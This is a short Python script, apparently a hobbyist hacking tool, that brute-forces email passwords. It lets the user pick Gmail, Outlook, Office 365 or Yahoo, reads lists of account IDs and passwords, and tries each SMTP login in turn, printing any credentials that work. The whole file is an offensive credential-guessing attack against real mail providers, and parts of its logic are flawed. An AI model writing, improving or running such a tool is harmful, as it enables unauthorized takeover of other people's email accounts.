import smtplib

def brut(smtp, port):
    server = smtplib.SMTP(smtp, port)
    server.ehlo()
    server.starttls()

    vacateFile = input("Enter ID List Or Email Recommended Email: ")
    passwordList = input("Enter Password List Or File Name: ")

    IDFile = open(vacateFile, "r")
    PasswordFile = open(passwordList, "r")

    for ID in IDFile:
        for Password in PasswordFile:
            try:
                server.login(ID, Password)
                print(f"id >>>>>> {ID} \n password >>>>>>> {Password}")
                break
            except smtplib.SMTPAuthenticationError:
                print(f"[!] Can Not Found Password [!] >>>>>>> {Password}")

def banner():
    print("""
    1- gmail
    2- outlook
    3- office
    4- yahoo
    """
    )

def check(choose):
    if choose == '1':
        brut("smtp.gmail.com", 587)
    elif choose == '2':
        brut("smtp.live.com", 587)
    elif choose == '3':
        brut("smtp.office365.com", 587)
    elif choose == '4':
        brut("smtp.mail.yahoo.com", 465)
    else:
        print(f"I Can't Find This {choose}")

choose = input("Enter Number: ")
check(choose)
